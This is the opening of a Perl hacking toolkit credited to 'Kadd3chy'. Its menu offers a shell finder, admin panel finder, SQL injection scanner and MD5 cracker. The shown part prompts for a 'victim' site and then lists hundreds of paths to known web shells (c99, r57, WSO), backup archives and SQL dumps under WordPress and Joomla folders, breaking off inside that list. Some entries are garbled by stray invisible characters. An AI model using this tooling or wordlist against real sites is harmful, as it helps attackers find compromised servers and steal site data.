#!usr/bin/perl

#Coded By Kadd3chy

use IO::Select;
use HTTP::Response;
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
use Term::ANSIColor qw(:constants);
use MIME::Base64;
use LWP;
use HTTP::Cookies;
use HTML::Entities;
use URI::Escape;
use Win32::Console::ANSI;
use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use LWP::UserAgent;
use HTTP::Request::Common;
use Term::ANSIColor;
use HTTP::Request::Common qw(GET);
$ag = LWP::UserAgent->new();
use MIME::Base64;

$Kadd3chy="

 *******                   **********                    **
/**////**                 /////**///                    /**
/**   /**  *****  *******     /**      ******   ******  /**
/*******  **///**//**///**    /**     **////** **////** /**
/**////  /******* /**  /**    /**    /**   /**/**   /** /**
/**      /**////  /**  /**    /**    /**   /**/**   /** /**
/**      //****** ***  /**    /**    //****** //******  ***
//        ////// ///   //     //      //////   //////  ///  

\n\n";

print color('bold green');
print $Kadd3chy;

print color('bold red'),"[";
print color('bold green'),"1";
print color('bold red'),"] ";
print color('bold white'),"Shell Finder\n";
print color('bold red'),"[";
print color('bold green'),"2";
print color('bold red'),"] ";
print color('bold white'),"Admin Finder\n";
print color('bold red'),"[";
print color('bold green'),"3";
print color('bold red'),"] ";
print color('bold white'),"SQLI Scanner\n";
print color('bold red'),"[";
print color('bold green'),"4";
print color('bold red'),"] ";
print color('bold white'),"MD5 Online Cracker\n";
print color('bold red'),"[";
print color('bold green'),"5";
print color('bold red'),"] ";
print color('bold white'),"Reverse IP Lookup\n";
print color('bold red'),"[";
print color('bold green'),"6";
print color('bold red'),"] ";
print color('bold white'),"About Me\n";
print color("white"),"[+] Choose Number : ";
my $targett = <>;
chomp $targett;
if($targett eq '1')
{
system('cls');
system('title Dir Finder');
                    {
                        print " Shell Finder \n";
use HTTP::Request;
use LWP::UserAgent;

system('cls');
system('title Shell Finder');
print"\n";
print  "\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n";
print "\t>                          Shell Finder                             >\n";
print "\t>                           C0ded By Kadd3chy                       >\n";
print "\t>                            Result In Done.txt                     >\n";
print  "\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n";
print "\n";

print " Scan Your Target\n\n Example: www.victim.com \n\n: ";


$site=<STDIN>;
chomp $site;

if($site !~ /http:\/\//) { $site = "http://$site/"; };

print "\n";

@path =  ('WSO.php','dz.php','w.php','wp-content/plugins/akismet/akismet.php','images/stories/w.php','w.php','shell.php','cpanel.php','cpn.php','sql.php','mysql.php','config. ​ php','configuration.php','madspot.php','Cgishell.pl','killer.php','changeall.php ​ ','2.php','Sh3ll.php','dz0.php','dam.php','user.php','dom.php','whmcs.php','r00t ​ .php','1.php','a.php','r0k.php','abc.php','egy.php','syrian_shell.php','xxx.php' &#8203; ,'settings.php','tmp.php','cyber.php','c99.php','r57.php','404.php','gaza.php',' ​ 1.php','d4rk.php','index1.php','nkr.php','xd.php','M4r0c.php','Dz.php','sniper.p ​ hp','ksa.php','v4team.php','offline.php','priv8.php','911.php','madspotshell.php ​ ','c100.php','sym.php','cp.php','tmp/cpn.php','tmp/w.php','tmp/r57.php','tmp/king.php','tmp/sok.php','tmp/ss.php','tmp/as.php','tmp/dz.php','tmp/r1z.php','tmp/whmcs.php','tmp/root.php','tmp/r00t.php','templates/beez/index.php','templates/beez/beez.php','templates/rhuk_milkyway/index.php','tmp/uploads.php','tmp/upload.php','tmp/sa.php','sa.php','readme.php','tmp/readme.php','wp.zip'.'wp-content/plugins/disqus-comment-system/disqus.php',
'd0mains.php','wp-content/plugins/akismet/akismet.php','madspotshell.php','info.php','egyshell.php','Sym.php','c22.php','c ​100.php',
'wp-content/plugins/akismet/admin.php#','configuration.php','g.php','wp-content/plugins/google-sitemap-generator/sitemap-core.php#',
'wp-content/plugins/akismet/widget.php#','xx.pl','ls.php','Cpanel.php','k.php','zone-h.php','tmp/user.php','tmp/Sym.php','cp.php',
'tmp/madspotshell.php','tmp/root.php','tmp/whmcs.php','tmp/index.php','tmp/2.php','tmp/dz.php','tmp/cpn.php',
'tmp/changeall.php','tmp/Cgishell.pl','tmp/sql.php','0day.php','tmp/admin.php','cliente/downloads/h4xor.php',
'whmcs/downloads/dz.php','L3b.php','d.php','tmp/d.php','tmp/L3b.php','wp-content/plugins/akismet/admin.php',
'templates/rhuk_milkyway/index.php','templates/beez/index.php','sado.php','admin1.php','upload.php','up.php','vb.zip','vb.rar',
'admin2.asp','uploads.php','sa.php','sysadmins/','admin1/','sniper.php','administration/Sym.php','images/Sym.php',
'/r57.php','/wp-content/plugins/disqus-comment-system/disqus.php','gzaa_spysl','sql-new.php','/shell.php','/sa.php','/admin.php',
'/sa2.php','/2.php','/gaza.php','/up.php','/upload.php','/uploads.php','/templates/beez/index.php','shell.php','/amad.php',
'/t00.php','/dz.php','/site.rar','/Black.php','/site.tar.gz','/home.zip','/home.rar','/home.tar','/home.tar.gz',
'/forum.zip','/forum.rar','/forum.tar','/forum.tar.gz','/test.txt','/ftp.txt','/user.txt','/site.txt','/error_log','/error',
'/cpanel','/awstats','/site.sql','/vb.sql','/forum.sql','r00t-s3c.php','c.php','/backup.sql','/back.sql','/data.sql','wp.rar/',
'wp-content/plugins/disqus-comment-system/disqus.php','asp.aspx','/templates/beez/index.php','tmp/vaga.php',
'tmp/killer.php','whmcs.php','abuhlail.php','tmp/killer.php','tmp/domaine.pl','tmp/domaine.php','useradmin/',
'tmp/d0maine.php','d0maine.php','tmp/sql.php','X.php','123.php','m.php','b.php','up.php','tmp/dz1.php','dz1.php','forum.zip','Symlink.php','Symlink.pl',
'forum.rar','joomla.zip','joomla.rar','wp.php','buck.sql','sysadmin.php','images​/c99.php', 'xd.php', 'c100.php',
'spy.aspx','xd.php','tmp/xd.php','sym/root/home/','billing/killer.php','tmp/upload.php','tmp/admin.php',
'Server.php','tmp/uploads.php','tmp/up.php','Server/','wp-admin/c99.php','tmp/priv8.php','priv8.php','cgi.pl/',
'tmp/cgi.pl','downloads/dom.php','templates/ja-helio-farsi/index.php','webadmin.html','admins.php',
'/wp-content/plugins/count-per-day/js/yc/d00.php','bluff.php','king.jeen','admins/','admins.asp','admins.php','wp.zip','/wp-content/plugins/disqus-comment-system/WSO.php',
'/wp-content/plugins/disqus-comment-system/dz.php',
'/wp-content/plugins/disqus-comment-system/DZ.php',
'/wp-content/plugins/disqus-comment-system/cpanel.php',
'/wp-content/plugins/disqus-comment-system/cpn.php',
'/wp-content/plugins/disqus-comment-system/sos.php',
'/wp-content/plugins/disqus-comment-system/term.php',
'/wp-content/plugins/disqus-comment-system/Sec-War.php',
'/wp-content/plugins/disqus-comment-system/sql.php',
'/wp-content/plugins/disqus-comment-system/ssl.php',
'/wp-content/plugins/disqus-comment-system/mysql.php',
'/wp-content/plugins/disqus-comment-system/WolF.php',
'/wp-content/plugins/disqus-comment-system/madspot.php',
'/wp-content/plugins/disqus-comment-system/Cgishell.pl',
'/wp-content/plugins/disqus-comment-system/killer.php',
'/wp-content/plugins/disqus-comment-system/changeall.php',
'/wp-content/plugins/disqus-comment-system/2.php',
'/wp-content/plugins/disqus-comment-system/Sh3ll.php',
'/wp-content/plugins/disqus-comment-system/dz0.php',
'/wp-content/plugins/disqus-comment-system/dam.php',
'/wp-content/plugins/disqus-comment-system/user.php',
'/wp-content/plugins/disqus-comment-system/dom.php',
'/wp-content/plugins/disqus-comment-system/whmcs.php',
'/wp-content/plugins/disqus-comment-system/vb.zip',
'/wp-content/plugins/disqus-comment-system/r00t.php',
'/wp-content/plugins/disqus-comment-system/c99.php',
'/wp-content/plugins/disqus-comment-system/gaza.php',
'/wp-content/plugins/disqus-comment-system/1.php',
'/wp-content/plugins/disqus-comment-system/d0mains.php',
'/wp-content/plugins/disqus-comment-system/madspotshell.php',
'/wp-content/plugins/disqus-comment-system/info.php',
'/wp-content/plugins/disqus-comment-system/egyshell.php',
'/wp-content/plugins/disqus-comment-system/Sym.php',
'/wp-content/plugins/disqus-comment-system/c22.php',
'/wp-content/plugins/disqus-comment-system/c100.php',
'/wp-content/plugins/disqus-comment-system/configuration.php',
'/wp-content/plugins/disqus-comment-system/g.php',
'/wp-content/plugins/disqus-comment-system/xx.pl',
'/wp-content/plugins/disqus-comment-system/ls.php',
'/wp-content/plugins/disqus-comment-system/Cpanel.php',
'/wp-content/plugins/disqus-comment-system/k.php',
'/wp-content/plugins/disqus-comment-system/zone-h.php',
'/wp-content/plugins/disqus-comment-system/tmp/user.php',
'/wp-content/plugins/disqus-comment-system/tmp/Sym.php',
'/wp-content/plugins/disqus-comment-system/cp.php',
'/wp-content/plugins/disqus-comment-system/tmp/madspotshell.php',
'/wp-content/plugins/disqus-comment-system/tmp/root.php',
'/wp-content/plugins/disqus-comment-system/tmp/whmcs.php',
'/wp-content/plugins/disqus-comment-system/tmp/index.php',
'/wp-content/plugins/disqus-comment-system/tmp/2.php',
'/wp-content/plugins/disqus-comment-system/tmp/dz.php',
'/wp-content/plugins/disqus-comment-system/tmp/cpn.php',
'/wp-content/plugins/disqus-comment-system/tmp/changeall.php',
'/wp-content/plugins/disqus-comment-system/tmp/Cgishell.pl',
'/wp-content/plugins/disqus-comment-system/tmp/sql.php',
'/wp-content/plugins/disqus-comment-system/0day.php',
'/wp-content/plugins/disqus-comment-system/tmp/admin.php',
'/wp-content/plugins/disqus-comment-system/L3b.php',
'/wp-content/plugins/disqus-comment-system/d.php',
'/wp-content/plugins/disqus-comment-system/tmp/d.php',
'/wp-content/plugins/disqus-comment-system/tmp/L3b.php',
'/wp-content/plugins/disqus-comment-system/sado.php',
'/wp-content/plugins/disqus-comment-system/admin1.php',
'/wp-content/plugins/disqus-comment-system/upload.php',
'/wp-content/plugins/disqus-comment-system/up.php',
'/wp-content/plugins/disqus-comment-system/vb.zip',
'/wp-content/plugins/disqus-comment-system/vb.rar',
'/wp-content/plugins/disqus-comment-system/admin2.asp',
'/wp-content/plugins/disqus-comment-system/uploads.php',
'/wp-content/plugins/disqus-comment-system/sa.php',
'/wp-content/plugins/disqus-comment-system/sysadmins/',
'/wp-content/plugins/disqus-comment-system/admin1/',
'/wp-content/plugins/disqus-comment-system/sniper.php',
'/wp-content/plugins/disqus-comment-system/images/Sym.php',
'/wp-content/plugins/disqus-comment-system//r57.php',
'/wp-content/plugins/disqus-comment-system/gzaa_spysl',
'/wp-content/plugins/disqus-comment-system/sql-new.php',
'/wp-content/plugins/disqus-comment-system//shell.php',
'/wp-content/plugins/disqus-comment-system//sa.php',
'/wp-content/plugins/disqus-comment-system//admin.php',
'/wp-content/plugins/disqus-comment-system//sa2.php',
'/wp-content/plugins/disqus-comment-system//2.php',
'/wp-content/plugins/disqus-comment-system//gaza.php',
'/wp-content/plugins/disqus-comment-system//up.php',
'/wp-content/plugins/disqus-comment-system//upload.php',
'/wp-content/plugins/disqus-comment-system//uploads.php',
'/wp-content/plugins/disqus-comment-system/shell.php',
'/wp-content/plugins/disqus-comment-system//amad.php',
'/wp-content/plugins/disqus-comment-system//t00.php',
'pwp-content/plugins/disqus-comment-system/disqus.php',
'wp-content/plugins/akismet/WSO.php',
'wp-content/plugins/akismet/dz.php',
'wp-content/plugins/akismet/DZ.php',
'wp-content/plugins/akismet/cpanel.php',
'wp-content/plugins/akismet/cpn.php',
'wp-content/plugins/akismet/sos.php',
'wp-content/plugins/akismet/term.php',
'wp-content/plugins/akismet/Sec-War.php',
'wp-content/plugins/akismet/sql.php',
'wp-content/plugins/akismet/ssl.php',
'wp-content/plugins/akismet/mysql.php',
'wp-content/plugins/akismet/WolF.php',
'wp-content/plugins/akismet/madspot.php',
'wp-content/plugins/akismet/Cgishell.pl',
'wp-content/plugins/akismet/killer.php',
'wp-content/plugins/akismet/changeall.php',
'wp-content/plugins/akismet/2.php',
'wp-content/plugins/akismet/Sh3ll.php',
'wp-content/plugins/akismet/dz0.php',
'wp-content/plugins/akismet/dam.php',
'wp-content/plugins/akismet/user.php',
'wp-content/plugins/akismet/dom.php',
'wp-content/plugins/akismet/whmcs.php',
'wp-content/plugins/akismet/vb.zip',
'wp-content/plugins/akismet/r00t.php',
'wp-content/plugins/akismet/c99.php',
'wp-content/plugins/akismet/gaza.php',
'wp-content/plugins/akismet/1.php',
'wp-content/plugins/akismet/d0mains.php',
'wp-content/plugins/akismet/madspotshell.php',
'wp-content/plugins/akismet/info.php',
'wp-content/plugins/akismet/egyshell.php',
'wp-content/plugins/akismet/Sym.php',
'wp-content/plugins/akismet/c22.php',
'wp-content/plugins/akismet/c100.php',
'wp-content/plugins/akismet/configuration.php',
'wp-content/plugins/akismet/g.php',
'wp-content/plugins/akismet/xx.pl',
'wp-content/plugins/akismet/ls.php',
'wp-content/plugins/akismet/Cpanel.php',
'wp-content/plugins/akismet/k.php',
'wp-content/plugins/akismet/zone-h.php',
'wp-content/plugins/akismet/tmp/user.php',
'wp-content/plugins/akismet/tmp/Sym.php',
'wp-content/plugins/akismet/cp.php',
'wp-content/plugins/akismet/tmp/madspotshell.php',
'wp-content/plugins/akismet/tmp/root.php',
'wp-content/plugins/akismet/tmp/whmcs.php',
'wp-content/plugins/akismet/tmp/index.php',
'wp-content/plugins/akismet/tmp/2.php',
'wp-content/plugins/akismet/tmp/dz.php',
'wp-content/plugins/akismet/tmp/cpn.php',
'wp-content/plugins/akismet/tmp/changeall.php',
'wp-content/plugins/akismet/tmp/Cgishell.pl',
'wp-content/plugins/akismet/tmp/sql.php',
'wp-content/plugins/akismet/0day.php',
'wp-content/plugins/akismet/tmp/admin.php',
'wp-content/plugins/akismet/L3b.php',
'wp-content/plugins/akismet/d.php',
'wp-content/plugins/akismet/tmp/d.php',
'wp-content/plugins/akismet/tmp/L3b.php',
'wp-content/plugins/akismet/sado.php',
'wp-content/plugins/akismet/admin1.php',
'wp-content/plugins/akismet/upload.php',
'wp-content/plugins/akismet/up.php',
'wp-content/plugins/akismet/vb.zip',
'wp-content/plugins/akismet/vb.rar',
'wp-content/plugins/akismet/admin2.asp',
'wp-content/plugins/akismet/uploads.php',
'wp-content/plugins/akismet/sa.php',
'wp-content/plugins/akismet/sysadmins/',
'wp-content/plugins/akismet/admin1/',
'wp-content/plugins/akismet/sniper.php',
'wp-content/plugins/akismet/images/Sym.php',
'wp-content/plugins/akismet//r57.php',
'wp-content/plugins/akismet/gzaa_spysl',
'wp-content/plugins/akismet/sql-new.php',
'wp-content/plugins/akismet//shell.php',
'wp-content/plugins/akismet//sa.php',
'wp-content/plugins/akismet//admin.php',
'wp-content/plugins/akismet//sa2.php',
'wp-content/plugins/akismet//2.php',
'wp-content/plugins/akismet//gaza.php',
'wp-content/plugins/akismet//up.php',
'wp-content/plugins/akismet//upload.php',
'wp-content/plugins/akismet//uploads.php',
'wp-content/plugins/akismet/shell.php',
'wp-content/plugins/akismet//amad.php',
'wp-content/plugins/akismet//t00.php',
'wp-content/plugins/akismet//dz.php',
'wp-content/plugins/akismet//site.rar',
'wp-content/plugins/akismet//Black.php',
'wp-content/plugins/akismet//site.tar.gz',
'wp-content/plugins/akismet//home.zip',
'wp-content/plugins/akismet//home.rar',
'wp-content/plugins/akismet//home.tar',
'wp-content/plugins/akismet//home.tar.gz',
'wp-content/plugins/akismet//forum.zip',
'wp-content/plugins/akismet//forum.rar',
'wp-content/plugins/akismet//forum.tar',
'wp-content/plugins/akismet//forum.tar.gz',
'wp-content/plugins/akismet//test.txt',
'wp-content/plugins/akismet//ftp.txt',
'wp-content/plugins/akismet//user.txt',
'wp-content/plugins/akismet//site.txt',
'wp-content/plugins/akismet//error_log',
'wp-content/plugins/akismet//error',
'wp-content/plugins/akismet//cpanel',
'wp-content/plugins/akismet//awstats',
'wp-content/plugins/akismet//site.sql',
'wp-content/plugins/akismet//vb.sql',
'wp-content/plugins/akismet//forum.sql',
'wp-content/plugins/akismet/r00t-s3c.php',
'wp-content/plugins/akismet/c.php',
'wp-content/plugins/akismet//backup.sql',
'wp-content/plugins/akismet//back.sql',
'wp-content/plugins/akismet//data.sql',
'wp-content/plugins/akismet/wp.rar/',
'wp-content/plugins/akismet/asp.aspx',
'wp-content/plugins/akismet/tmp/vaga.php',
'wp-content/plugins/akismet/tmp/killer.php',
'wp-content/plugins/akismet/whmcs.php',
'wp-content/plugins/akismet/abuhlail.php',
'wp-content/plugins/akismet/tmp/killer.php',
'wp-content/plugins/akismet/tmp/domaine.pl',
'wp-content/plugins/akismet/tmp/domaine.php',
'wp-content/plugins/akismet/useradmin/',
'wp-content/plugins/akismet/tmp/d0maine.php',
'wp-content/plugins/akismet/d0maine.php',
'wp-content/plugins/akismet/tmp/sql.php',
'wp-content/plugins/akismet/X.php',
'wp-content/plugins/akismet/123.php',
'wp-content/plugins/akismet/m.php',
'wp-content/plugins/akismet/b.php',
'wp-content/plugins/akismet/up.php',
'wp-content/plugins/akismet/tmp/dz1.php',
'wp-content/plugins/akismet/dz1.php',
'wp-content/plugins/akismet/forum.zip',
'wp-content/plugins/akismet/Symlink.php',
'wp-content/plugins/akismet/Symlink.pl',
'wp-content/plugins/akismet/forum.rar',
'wp-content/plugins/akismet/joomla.zip',
'wp-content/plugins/akismet/joomla.rar',
'wp-content/plugins/akismet/wp.php',
'wp-content/plugins/akismet/buck.sql',
'wp-content/plugins/akismet/sysadmin.php',
'wp-content/plugins/akismet/images/c99.php',
'wp-content/plugins/akismet/xd.php',
'wp-content/plugins/akismet/c100.php',
'wp-content/plugins/akismet/spy.aspx',
'wp-content/plugins/akismet/xd.php',
'wp-content/plugins/akismet/tmp/xd.php',
'wp-content/plugins/akismet/sym/root/home/',
'wp-content/plugins/akismet/billing/killer.php',
'wp-content/plugins/akismet/tmp/upload.php',
'wp-content/plugins/akismet/tmp/admin.php',
'wp-content/plugins/akismet/Server.php',
'wp-content/plugins/akismet/tmp/uploads.php',
'wp-content/plugins/akismet/tmp/up.php',
'wp-content/plugins/akismet/Server/',
'wp-content/plugins/akismet/wp-admin/c99.php',
'wp-content/plugins/akismet/tmp/priv8.php',
'wp-content/plugins/akismet/priv8.php',
'wp-content/plugins/akismet/cgi.pl/',
'wp-content/plugins/akismet/tmp/cgi.pl',
'wp-content/plugins/akismet/downloads/dom.php',
'wp-content/plugins/akismet/webadmin.html',
'wp-content/plugins/akismet/admins.php',
'wp-content/plugins/akismet/bluff.php',
'wp-content/plugins/akismet/king.jeen',
'wp-content/plugins/akismet/admins/',
'wp-content/plugins/akismet/admins.asp',
'wp-content/plugins/akismet/admins.php',
'wp-content/plugins/akismet/wp.zip',
'wp-content/plugins/akismet/disqus.php',
'wp-content/plugins/google-sitemap-generator//cpanel',
'wp-content/plugins/google-sitemap-generator//awstats',
'wp-content/plugins/google-sitemap-generator//site.sql',
'wp-content/plugins/google-sitemap-generator//vb.sql',
'wp-content/plugins/google-sitemap-generator//forum.sql',
'wp-content/plugins/google-sitemap-generator/r00t-s3c.php',
'wp-content/plugins/google-sitemap-generator/c.php',
'wp-content/plugins/google-sitemap-generator//backup.sql',
'wp-content/plugins/google-sitemap-generator//back.sql',
'wp-content/plugins/google-sitemap-generator//data.sql',
'wp-content/plugins/google-sitemap-generator/wp.rar/',
'wp-content/plugins/google-sitemap-generator/asp.aspx',
'wp-content/plugins/google-sitemap-generator/tmp/vaga.php',
'wp-content/plugins/google-sitemap-generator/tmp/killer.php',
'wp-content/plugins/google-sitemap-generator/whmcs.php',
'wp-content/plugins/google-sitemap-generator/abuhlail.php',
'wp-content/plugins/google-sitemap-generator/tmp/killer.php',
'wp-content/plugins/google-sitemap-generator/tmp/domaine.pl',
'wp-content/plugins/google-sitemap-generator/tmp/domaine.php',
'wp-content/plugins/google-sitemap-generator/useradmin/',
'wp-content/plugins/google-sitemap-generator/tmp/d0maine.php',
'wp-content/plugins/google-sitemap-generator/d0maine.php',
'wp-content/plugins/google-sitemap-generator/tmp/sql.php',
'wp-content/plugins/google-sitemap-generator/X.php',
'wp-content/plugins/google-sitemap-generator/123.php',
'wp-content/plugins/google-sitemap-generator/m.php',
'wp-content/plugins/google-sitemap-generator/b.php',
'wp-content/plugins/google-sitemap-generator/up.php',
'wp-content/plugins/google-sitemap-generator/tmp/dz1.php',
'wp-content/plugins/google-sitemap-generator/dz1.php',
'wp-content/plugins/google-sitemap-generator/forum.zip',
'wp-content/plugins/google-sitemap-generator/Symlink.php',
'wp-content/plugins/google-sitemap-generator/Symlink.pl',
'wp-content/plugins/google-sitemap-generator/forum.rar',
'wp-content/plugins/google-sitemap-generator/joomla.zip',
'wp-content/plugins/google-sitemap-generator/joomla.rar',
'wp-content/plugins/google-sitemap-generator/wp.php',
'wp-content/plugins/google-sitemap-generator/buck.sql',
'wp-content/plugins/google-sitemap-generator/sysadmin.php',
'wp-content/plugins/google-sitemap-generator/images/c99.php',
'wp-content/plugins/google-sitemap-generator/xd.php',
'wp-content/plugins/google-sitemap-generator/c100.php',
'wp-content/plugins/google-sitemap-generator/spy.aspx',
'wp-content/plugins/google-sitemap-generator/xd.php',
'wp-content/plugins/google-sitemap-generator/tmp/xd.php',
'wp-content/plugins/google-sitemap-generator/sym/root/home/',
'wp-content/plugins/google-sitemap-generator/billing/killer.php',
'wp-content/plugins/google-sitemap-generator/tmp/upload.php',
'wp-content/plugins/google-sitemap-generator/tmp/admin.php',
'wp-content/plugins/google-sitemap-generator/Server.php',
'wp-content/plugins/google-sitemap-generator/tmp/uploads.php',
'wp-content/plugins/google-sitemap-generator/tmp/up.php',
'wp-content/plugins/google-sitemap-generator/Server/',
'wp-content/plugins/google-sitemap-generator/wp-admin/c99.php',
'wp-content/plugins/google-sitemap-generator/tmp/priv8.php',
'wp-content/plugins/google-sitemap-generator/priv8.php',
'wp-content/plugins/google-sitemap-generator/cgi.pl/',
'wp-content/plugins/google-sitemap-generator/tmp/cgi.pl',
'wp-content/plugins/google-sitemap-generator/downloads/dom.php',
'wp-content/plugins/google-sitemap-generator/webadmin.html',
'wp-content/plugins/google-sitemap-generator/admins.php',
'wp-content/plugins/google-sitemap-generator/bluff.php',
'wp-content/plugins/google-sitemap-generator/king.jeen',
'wp-content/plugins/google-sitemap-generator/admins/',
'wp-content/plugins/google-sitemap-generator/admins.asp',
'wp-content/plugins/google-sitemap-generator/admins.php',
'wp-content/plugins/google-sitemap-generator/wp.zip',
'wp-content/plugins/google-sitemap-generator/sitemap-core.php',
'/templates/beez/WSO.php',
'/templates/beez/dz.php',
'/templates/beez/DZ.php',
'/templates/beez/cpanel.php',
'/templates/beez/cpn.php',
'/templates/beez/sos.php',
'/templates/beez/term.php',
'/templates/beez/Sec-War.php',
'/templates/beez/sql.php',
'/templates/beez/ssl.php',
'/templates/beez/mysql.php',
'/templates/beez/WolF.php',
'/templates/beez/madspot.php',
'/templates/beez/Cgishell.pl',
'/templates/beez/killer.php',
'/templates/beez/changeall.php',
'/templates/beez/2.php',
'/templates/beez/Sh3ll.php',
'/templates/beez/dz0.php',
'/templates/beez/dam.php',
'/templates/beez/user.php',
'/templates/beez/dom.php',
'/templates/beez/whmcs.php',
'/templates/beez/vb.zip',
'/templates/beez/r00t.php',
'/templates/beez/c99.php',
'/templates/beez/gaza.php',
'/templates/beez/1.php',
'/templates/beez/d0mains.php',
'/templates/beez/madspotshell.php',
'/templates/beez/info.php',
'/templates/beez/egyshell.php',
'/templates/beez/Sym.php',
'/templates/beez/c22.php',
'/templates/beez/c100.php',
'/templates/beez/configuration.php',
'/templates/beez/g.php',
'/templates/beez/xx.pl',
'/templates/beez/ls.php',
'/templates/beez/Cpanel.php',
'/templates/beez/k.php',
'/templates/beez/zone-h.php',
'/templates/beez/tmp/user.php',
'/templates/beez/tmp/Sym.php',
'/templates/beez/cp.php',
'/templates/beez/tmp/madspotshell.php',
'/templates/beez/tmp/root.php',
'/templates/beez/tmp/whmcs.php',
'/templates/beez/tmp/index.php',
'/templates/beez/tmp/2.php',
'/templates/beez/tmp/dz.php',
'/templates/beez/tmp/cpn.php',
'/templates/beez/tmp/changeall.php',
'/templates/beez/tmp/Cgishell.pl',
'/templates/beez/tmp/sql.php',
'/templates/beez/0day.php',
'/templates/beez/tmp/admin.php',
'/templates/beez/L3b.php',
'/templates/beez/d.php',
'/templates/beez/tmp/d.php',
'/templates/beez/tmp/L3b.php',
'/templates/beez/sado.php',
'/templates/beez/admin1.php',
'/templates/beez/upload.php',
'/templates/beez/up.php',
'/templates/beez/vb.zip',
'/templates/beez/vb.rar',
'/templates/beez/admin2.asp',
'/templates/beez/uploads.php',
'/templates/beez/sa.php',
'/templates/beez/sysadmins/',
'/templates/beez/admin1/',
'/templates/beez/sniper.php',
'/templates/beez/images/Sym.php',
'/templates/beez//r57.php',
'/templates/beez/gzaa_spysl',
'/templates/beez/sql-new.php',
'/templates/beez//shell.php',
'/templates/beez//sa.php',
'/templates/beez//admin.php',
'/templates/beez//sa2.php',
'/templates/beez//2.php',
'/templates/beez//gaza.php',
'/templates/beez//up.php',
'/templates/beez//upload.php',
'/templates/beez//uploads.php',
'/templates/beez/shell.php',
'/templates/beez//amad.php',
'/templates/beez//t00.php',
'/templates/beez//dz.php',
'/templates/beez//site.rar',
'/templates/beez//Black.php',
'/templates/beez//site.tar.gz',
'/templates/beez//home.zip',
'/templates/beez//home.rar',
'/templates/beez//home.tar',
'/templates/beez//home.tar.gz',
'/templates/beez//forum.zip',
'/templates/beez//forum.rar',
'/templates/beez//forum.tar',
'/templates/beez//forum.tar.gz',
'/templates/beez//test.txt',
'/templates/beez//ftp.txt',
'/templates/beez//user.txt',
'/templates/beez//site.txt',
'/templates/beez//error_log',
'/templates/beez//error',
'/templates/beez//cpanel',
'/templates/beez//awstats',
'/templates/beez//site.sql',
'/templates/beez//vb.sql',
'/templates/beez//forum.sql',
'/templates/beez/r00t-s3c.php',
'/templates/beez/c.php',
'/templates/beez//backup.sql',
'/templates/beez//back.sql',
'/templates/beez//data.sql',
'/templates/beez/wp.rar/',
'/templates/beez/asp.aspx',
'/templates/beez/tmp/vaga.php',
'/templates/beez/tmp/killer.php',
'/templates/beez/whmcs.php',
'/templates/beez/abuhlail.php',
'/templates/beez/tmp/killer.php',
'/templates/beez/tmp/domaine.pl',
'/templates/beez/tmp/domaine.php',
'/templates/beez/useradmin/',
'/templates/beez/tmp/d0maine.php',
'/templates/beez/d0maine.php',
'/templates/beez/tmp/sql.php',
'/templates/beez/X.php',
'/templates/beez/123.php',
'/templates/beez/m.php',
'/templates/beez/b.php',
'/templates/beez/up.php',
'/templates/beez/tmp/dz1.php',
'/templates/beez/dz1.php',
'/templates/beez/forum.zip',
'/templates/beez/Symlink.php',
'/templates/beez/Symlink.pl',
'/templates/beez/forum.rar',
'/templates/beez/joomla.zip',
'/templates/beez/joomla.rar',
'/templates/beez/wp.php',
'/templates/beez/buck.sql',
'/templates/beez/sysadmin.php',
'/templates/beez/images/c99.php',
'/templates/beez/xd.php',
'/templates/beez/c100.php',
'/templates/beez/spy.aspx',
'/templates/beez/xd.php',
'/templates/beez/tmp/xd.php',
'/templates/beez/sym/root/home/',
'/templates/beez/billing/killer.php',
'/templates/beez/tmp/upload.php',
'/templates/beez/tmp/admin.php',
'/templates/beez/Server.php',
'/templates/beez/tmp/uploads.php',
'/templates/beez/tmp/up.php',
'/templates/beez/Server/',
'/templates/beez/wp-admin/c99.php',
'/templates/beez/tmp/priv8.php',
'/templates/beez/priv8.php',
'/templates/beez/cgi.pl/',
'/templates/beez/tmp/cgi.pl',
'/templates/beez/downloads/dom.php',
'/templates/beez/webadmin.html',
'/templates/beez/admins.php',
'/templates/beez/bluff.php',
'/templates/beez/king.jeen',
'/templates/beez/admins/',
'/templates/beez/admins.asp',
'/templates/beez/admins.php',
'/templates/beez/wp.zip',
'/templates/beez/index.php','/images/WSO.php',
'/images/dz.php',
'/images/DZ.php',
'/images/cpanel.php',
'/images/cpn.php',
'/images/sos.php',
'/images/term.php',
'/images/Sec-War.php',
'/images/sql.php',
'/images/ssl.php',
'/images/mysql.php',
'/images/WolF.php',
'/images/madspot.php',
'/images/Cgishell.pl',
'/images/killer.php',
'/images/changeall.php',
'/images/2.php',
'/images/Sh3ll.php',
'/images/dz0.php',
'/images/dam.php',
'/images/user.php',
'/images/dom.php',
'/images/whmcs.php',
'/images/vb.zip',
'/images/r00t.php',
'/images/c99.php',
'/images/gaza.php',
'/images/1.php',
'/images/d0mains.php',
'/images/madspotshell.php',
'/images/info.php',
'/images/egyshell.php',
'/images/Sym.php',
'/images/c22.php',
'/images/c100.php',
'/images/configuration.php',
'/images/g.php',
'/images/xx.pl',
'/images/ls.php',
'/images/Cpanel.php',
'/images/k.php',
'/images/zone-h.php',
'/images/tmp/user.php',
'/images/tmp/Sym.php',
'/images/cp.php',
'/images/tmp/madspotshell.php',
'/images/tmp/root.php',
'/images/tmp/whmcs.php',
'/images/tmp/index.php',
'/images/tmp/2.php',
'/images/tmp/dz.php',
'/images/tmp/cpn.php',
'/images/tmp/changeall.php',
'/images/tmp/Cgishell.pl',
'/images/tmp/sql.php',
'/images/0day.php',
'/images/tmp/admin.php',
'/images/L3b.php',
'/images/d.php',
'/images/tmp/d.php',
'/images/tmp/L3b.php',
'/images/sado.php',
'/images/admin1.php',
'/images/upload.php',
'/images/up.php',
'/images/vb.zip',
'/images/vb.rar',
'/images/admin2.asp',
'/images/uploads.php',
'/images/sa.php',
'/images/sysadmins/',
'/images/admin1/',
'/images/sniper.php',
'/images/images/Sym.php',
'/images//r57.php',
'/images/gzaa_spysl',
'/images/sql-new.php',
'/images//shell.php',
'/images//sa.php',
'/images//admin.php',
'/images//sa2.php',
'/images//2.php',
'/images//gaza.php',
